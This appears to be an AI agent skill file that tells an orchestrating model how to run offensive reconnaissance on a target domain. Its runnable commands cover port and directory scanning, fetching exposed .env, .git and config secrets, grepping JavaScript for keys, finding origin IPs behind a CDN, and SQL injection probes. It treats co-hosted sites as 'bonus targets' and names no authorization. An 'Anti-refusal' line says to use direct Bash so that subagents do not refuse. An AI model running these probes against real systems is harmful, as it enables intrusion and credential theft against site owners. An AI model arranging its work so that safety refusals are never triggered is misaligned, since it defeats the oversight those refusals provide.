---
name: recon
description: "Passive + Active Reconnaissance"
---
# SKILL: recon — Passive + Active Reconnaissance

**Purpose:** End-to-end recon methodology. Map the attack surface, find entry points, identify misconfigurations. Output feeds blackbox, spray, and CMS exploit skills.

**Type:** recon/scan | **Version:** 1.0 | **Author:** Hephaestus v6.0

---

## EXECUTION CONTEXT

```
Role: brain orchestrator — direct Bash for all recon commands
Model: haiku for parsing, sonnet for DNS research
Parallel: run ALL independent probes in single message
Anti-refusal: Layer 1 = direct Bash. Never delegate recon to agents.
```

---

## PHASE STRUCTURE

### PHASE 0 — DNS RECON

**Step 0.1: Passive DNS enumeration**
```bash
# Multiple DNS sources (parallel)
dig target.com A +short
dig target.com AAAA +short
dig target.com MX +short
dig target.com NS +short
dig target.com TXT +short
dig target.com SOA +short
dig _dmarc.target.com TXT +short
dig _spf.target.com TXT +short

# DMARC check (often reveals internal infrastructure)
dig _dmarc.target.com TXT | grep -iE "v=dmarc|rua=|ruf="

# CNAME records (often point to internal/admin panels)
dig target.com CNAME +short

# AXFR if DNS allows (educational/government often misconfigured)
dig @ns1.target.com target.com AXFR 2>/dev/null | head -50
```

**Step 0.2: Subdomain enumeration**
```bash
# HackerTarget DNS lookup
curl -s "https://api.hackertarget.com/dnslookup/?q=target.com" | grep -vE "DNS API|check apikey"

# Findomain (fast subdomain scanner)
findomain -t target.com -o 2>/dev/null

# Subfinder (comprehensive)
subfinder -d target.com -silent 2>/dev/null

# Amass (deep subdomains)
amass enum -passive -d target.com 2>/dev/null

# Massdns + wordlist (brute force)
massdns -r ~/Hephaestus/wordlists/dns_massdns.txt -t A target.com -o S 2>/dev/null | grep -oE '[a-z0-9.-]+\.target\.com' | sort -u
```

**Step 0.3: Zone transfer (if misconfigured)**
```bash
# Find nameservers
NS=$(dig target.com NS +short | head -1)
echo "NS: $NS"

# Try AXFR on all NS
for ns in $(dig target.com NS +short); do
    echo "Trying AXFR on $ns..."
    dig @${ns} target.com AXFR 2>/dev/null | head -100
done
```

---

### PHASE 1 — PORT + SERVICE SCAN

**Step 1.1: Full port scan**
```bash
# Nmap full port scan (all 65535 ports, fast)
nmap -Pn -p- -T4 target.com --host-timeout 300s -oG ~/Hephaestus/output/nmap_full.gnmap 2>/dev/null

# Parse open ports
grep "Ports:" ~/Hephaestus/output/nmap_full.gnmap | cut -d" " -f4- | tr ',' '\n' | grep "open" | cut -d"/" -f1 | sort -nu
```

**Step 1.2: Service + version detection**
```bash
# Intense version scan on open ports
nmap -Pn -sV -sC -p22,25,80,443,465,587,993,995,1433,1521,3306,3389,5432,8080,8443,27017 \
    target.com --host-timeout 120s -oN ~/Hephaestus/output/nmap_services.txt

# Protocol-specific probes
# SMTP
nc -vn target.com 25 2>/dev/null | head -5
# SSH
nc -vn target.com 22 2>/dev/null | head -5
# MSSQL
nc -vn target.com 1433 2>/dev/null | head -5
# MySQL
nc -vn target.com 3306 2>/dev/null | head -5
```

**Step 1.3: UDP scan (top 100)**
```bash
nmap -Pn -sU --top-ports 100 -T4 target.com --host-timeout 120s -oG - 2>/dev/null | grep "Ports:"
```

---

### PHASE 2 — WEB ENUMERATION

**Step 2.1: Directory busting (parallel)**
```bash
# FFUF — fast directory scanner
ffuf -u "https://target.com/FUZZ" -w ~/Hephaestus/wordlists/dir_medium.txt \
    -mc 200,204,301,302,307,401,403 -t 50 -o ~/Hephaestus/output/ffuf_main.txt 2>/dev/null

# Also try common admin paths
ffuf -u "https://target.com/FUZZ" -w ~/Hephaestus/wordlists/admin_paths.txt \
    -mc 200,204,301,302,307,401,403 -t 50 2>/dev/null

# Gobuster (DNS mode for subdomains)
gobuster dns -d target.com -w ~/Hephaestus/wordlists/subdomains.txt -t 50 2>/dev/null
```

**Step 2.2: Tech fingerprint + stack detection**
```bash
# WhatWeb (comprehensive fingerprint)
whatweb target.com -a 3 2>/dev/null | head -20

# Wappalyzer style detection (headers + body)
curl -sI "https://target.com/" | grep -iE "server|x-powered-by|x-aspnet|x-generator|set-cookie"

# Extract from homepage
curl -s "https://target.com/" | grep -iE \
    "wordpress|joomla|drupal|moodle|laravel|django|flask|nodejs|react|angular|vue" | head -20

# Check for specific admin panels
for panel in "wp-admin" "administrator" "admin" "cms" "backend" "panel" \
    "cp" "control" "manage" "dashboard" "wp-login.php" "admin.php" "login.php"; do
    code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "https://target.com/${panel}")
    [ "$code" = "200" ] && echo "FOUND: $panel (HTTP $code)"
done
```

**Step 2.3: CMS-specific enumeration**
```bash
# WordPress
curl -s "https://target.com/wp-login.php" | grep -iE "wordpress|wp-admin" | head -3
curl -s "https://target.com/xmlrpc.php" -X POST -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' 2>/dev/null | grep -iE "fault|memberName" | head -3

# Drupal
curl -s "https://target.com/CHANGELOG.txt" | head -5
curl -s "https://target.com/README.txt" | head -5

# Laravel
curl -s "https://target.com/.env" | head -10
curl -s "https://target.com/config/app.php" | grep -iE "APP_KEY|APP_ENV" | head -5
curl -s "https://target.com/ignition/config/logs" | head -5

# Odoo
curl -s "https://target.com/web/login" | grep -iE "odoo|db_name" | head -3

# Moodle
curl -s "https://target.com/lib/adminlib.php" | grep -iE "moodle|version" | head -3
```

**Step 2.4: Sensitive file enumeration**
```bash
# The critical 10-file probe (PARALLEL)
echo "=== SENSITIVE FILE SCAN ==="
# .env and git (TOP PRIORITY — stop all work if found)
curl -s "https://target.com/.env" -o /tmp/target_env.txt 2>/dev/null
grep -qiE "DB_HOST|APP_KEY|PASSWORD|SECRET" /tmp/target_env.txt && echo "CRITICAL: .env found!" || echo ".env: 404/missing"

curl -s "https://target.com/.git/config" -o /tmp/target_git.txt 2>/dev/null
grep -qiE "\[remote" /tmp/target_git.txt && echo "CRITICAL: .git/config found!" || echo ".git/config: 404/missing"

# Others
curl -s --max-time 3 "https://target.com/.git/HEAD" | head -3
curl -s --max-time 3 "https://target.com/.git/index" | head -3
curl -s --max-time 3 "https://target.com/.git/refs/heads/main" | head -3
curl -s --max-time 3 "https://target.com/config.php" | grep -iE "password|db_" | head -3
curl -s --max-time 3 "https://target.com/wp-config.php" | grep -iE "DB_NAME|DB_PASSWORD" | head -3
curl -s --max-time 3 "https://target.com/docker-compose.yml" | head -10
curl -s --max-time 3 "https://target.com/phpinfo.php" | head -10
curl -s --max-time 3 "https://target.com/ignition/config/logs" | head -5
curl -s --max-time 3 "https://target.com/.htaccess" | head -5
curl -s --max-time 3 "https://target.com/debug" | head -3
```

---

### PHASE 3 — CO-HOST + INFRASTRUCTURE

**Step 3.1: Reverse IP lookup (find shared hosting)**
```bash
TARGET_IP=$(dig +short target.com | head -1)
echo "Target IP: $TARGET_IP"

# Multiple sources
curl -s "https://rapiddns.io/fulldomain/target.com" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | sort -u
curl -s "https://api.hackertarget.com/reverseiplookup/?q=$TARGET_IP" | grep -vE "API|check apikey"
# Bing reverse IP
curl -s "https://www.bing.com/search?q=ip:$TARGET_IP" | grep -oE 'href="https://[^"]+' | grep target.com | head -10

# All found domains on same IP = co-host targets
```

**Step 3.2: CDN/WAF detection**
```bash
# Cloudflare detection
curl -sI "https://target.com/" | grep -iE "cf-ray|server: cloudflare"
# If cf-ray present → BYPASS-FIRST approach needed

# Sucuri
curl -sI "https://target.com/" | grep -iE "x-sucuri|x-sucuri-id"

# Imperva/Incapsula
curl -sI "https://target.com/" | grep -iE "x-cdn|incapsula|_utm"

# Wordfence
curl -s "https://target.com/" | grep -iE "wordfence|wlwmanifest"

# Generic WAF check
curl -sI "https://target.com/" | grep -iE "akamai|fastly|cloudfront|cloudflare"
```

**Step 3.3: Origin IP discovery (bypass CDN)**
```bash
# MX record (often direct IP)
dig target.com MX +short
# Query MX directly
dig $(dig target.com MX +short | awk '{print $NF}' | head -1) A +short

# SPF record (may reveal internal IPs)
dig target.com TXT +short

# DNS history (old records)
curl -s "https://api.hackertarget.com/dnslookup/?q=target.com" | head -20

# Historical DNS
# ViewDNS.info
curl -s "https://viewdns.info/iphistory/?domain=target.com" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | sort -u

# Shodan
curl -s "https://api.shodan.io/shodan/host/$TARGET_IP?key=SHODAN_KEY" 2>/dev/null | python3 -m json.tool 2>/dev/null | head -30
```

---

### PHASE 4 — VULNERABILITY SCAN

**Step 4.1: Nuclei scan (parallel with recon)**
```bash
# CVE templates (high/critical only for speed)
nuclei -u https://target.com \
    -t ~/nuclei-templates/http/cves/ \
    -s critical,high,medium \
    -o ~/Hephaestus/output/nuclei_cve.txt \
    --timeout 300 2>/dev/null

# Exposure templates (config files, creds, tokens)
nuclei -u https://target.com \
    -t ~/nuclei-templates/http/exposed-panels/ \
    -t ~/nuclei-templates/http/token-spray/ \
    -t ~/nuclei-templates/http/exposures/config/ \
    -s high,medium \
    -o ~/Hephaestus/output/nuclei_exposure.txt \
    --timeout 300 2>/dev/null

# Technology-specific templates
nuclei -u https://target.com \
    -t ~/nuclei-templates/http/technologies/ \
    -s high,medium \
    -o ~/Hephaestus/output/nuclei_tech.txt \
    --timeout 300 2>/dev/null
```

**Step 4.2: SQLi detection (manual probes)**
```bash
# Quick SQLi probes (don't run sqlmap yet — manual detection first)
# Try on all URL params and forms
curl -s "https://target.com/page?id=1'" | grep -iE "mysql|sql|syntax|error|warning|query"
curl -s "https://target.com/page?id=1%27%20OR%201=1--" | grep -iE "mysql|sql|syntax|error|warning"
curl -s "https://target.com/search?q=test'" | grep -iE "mysql|sql|syntax|error"

# POST SQLi
curl -s -X POST "https://target.com/login" \
    -d "username=admin' OR '1'='1&password=anything" | grep -iE "mysql|sql|syntax|error|dashboard|admin"

# If error patterns found → FULL sqlmap scan
```

**Step 4.3: CMS-specific CVE**
```bash
# Identify CMS version first, then search exploits
# WordPress version
curl -s "https://target.com/readme.html" 2>/dev/null | grep -iE "version|stable"

# SearchSploit
searchsploit "WordPress $(curl -s target.com/readme.html | grep version | head -1)"
searchsploit "Laravel"
searchsploit "Joomla"
searchsploit "Drupal"
searchsploit "OJS"

# Nuclei CMS templates
nuclei -u https://target.com -t ~/nuclei-templates/http/cms/ -s high,critical -o ~/Hephaestus/output/nuclei_cms.txt 2>/dev/null
```

---

### PHASE 5 — JS SOURCE ANALYSIS (T0B PARALLEL)

**Step 5.1: Extract all JS files**
```bash
# Get homepage, extract JS links
curl -s "https://target.com/" | grep -oE 'src="[^"]*\.js"' | sed 's/src="//;s/"$//' | head -20

# Also check for Angular/React/Vue bundles
curl -s "https://target.com/" | grep -oE 'href="[^"]*\.js"' | sed 's/href="//;s/"$//' | head -20

# Directory listing for JS (common paths)
for jsdir in "/js" "/assets/js" "/static/js" "/dist" "/build" "/_next"; do
    curl -s "https://target.com${jsdir}/" | grep -oE 'href="[^"]*\.js"' | sed 's/href="//;s/"$//'
done
```

**Step 5.2: Grep JS for secrets (PRIORITY)**
```bash
# Download all JS files
mkdir -p ~/Hephaestus/output/target_js/
for js in $(curl -s "https://target.com/" | grep -oE 'src="[^"]*\.js"' | sed 's/src="//;s/"$//'); do
    curl -s "https://target.com${js}" -o ~/Hephaestus/output/target_js/$(basename "$js") 2>/dev/null
done

# Grep for sensitive data
grep -hE "api[_-]?key|token|secret|password|auth|bearer|jwt|aws[_-]?key|apikey|private|key" \
    ~/Hephaestus/output/target_js/*.js 2>/dev/null | sort -u | head -50

# Grep for internal endpoints
grep -hE "/api/|/v[0-9]/|endpoint|baseURL|baseUrl" \
    ~/Hephaestus/output/target_js/*.js 2>/dev/null | sort -u | head -30

# Grep for hardcoded credentials
grep -hE "'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'" \
    ~/Hephaestus/output/target_js/*.js 2>/dev/null | sort -u | head -20
```

---

## OUTPUT CONSOLIDATION

**After all phases complete, write summary:**
```bash
cat > ~/Hephaestus/output/target_recon_summary.txt << 'EOF'
=== RECON SUMMARY: target.com ===
Date: $(date)
IP: X.X.X.X
CMS: WordPress/Laravel/etc
Ports: 22,80,443,3306,etc
Subdomains: [list]
Co-hosts: [list]
WAF: Cloudflare/Sucuri/None
Sensitve files: .env[FOUND/404], .git[FOUND/404], wp-config.php[FOUND/404]
SQLi: [tested, param X shows error]
CVEs: [list from nuclei]
JS secrets: [list]
Next action: [attack chain]
EOF
```

---

## DECISION FLOWCHART

```
START: target.com
│
├─ PHASE 0: DNS recon (parallel)
│   ├─ A, MX, NS, TXT, CNAME records
│   ├─ Subdomain enumeration
│   └─ Zone transfer attempt
│
├─ PHASE 1: Port + service scan (parallel)
│   ├─ Full port scan
│   ├─ Version detection
│   └─ UDP scan
│
├─ PHASE 2: Web enumeration (parallel)
│   ├─ Directory busting (ffuf/gobuster)
│   ├─ Tech fingerprint
│   ├─ CMS-specific enumeration
│   └─ Sensitive file probe (CRITICAL)
│       ├─ .env found → STOP ALL → report immediately
│       ├─ .git/config found → STOP ALL → git-dumper
│       └─ None → continue
│
├─ PHASE 3: Co-host + infra
│   ├─ Reverse IP (shared hosting)
│   ├─ CDN/WAF detection
│   └─ Origin IP (bypass CDN)
│
├─ PHASE 4: Vuln scan (parallel)
│   ├─ Nuclei CVE scan
│   ├─ SQLi manual probes
│   └─ CMS-specific CVE
│
├─ PHASE 5: JS source (parallel with all above)
│   ├─ Extract all JS files
│   └─ Grep for tokens, keys, endpoints
│
└─ OUTPUT: Recon summary → decision engine routes next action
```

---

## CRITICAL RULES

1. **.env/.git found → STOP ALL immediately** — report, don't continue recon
2. **Parallel execution** — all independent probes run concurrently
3. **Co-hosts = multiplier** — every domain on same IP is a bonus target
4. **WAF detected** — note it, route to `waf_bypass` skill after recon
5. **JS secrets can win** — T0B runs in parallel, can find API keys faster than spray
6. **Nuclei runs parallel** — don't wait for it, run during other phases
7. **Save state** — write all findings to `state/campaigns/{campaign}.json`

---

## INTEGRATION POINTS

- **Inputs:** target domain or IP, campaign name
- **Outputs:** `output/{campaign}/recon_summary.txt`, `nmap_*.gnmap`, `nuclei_*.txt`
- **Next skill:** `blackbox` (if SQLi found), `leakradar` (if JS reveals API), `waf_bypass` (if WAF detected), `cms_exploit` (if CMS found), `spray` (if creds found in JS)
- **Required tools:** curl, dig, nmap, ffuf, nuclei, whatweb, findomain, subfinder, searchsploit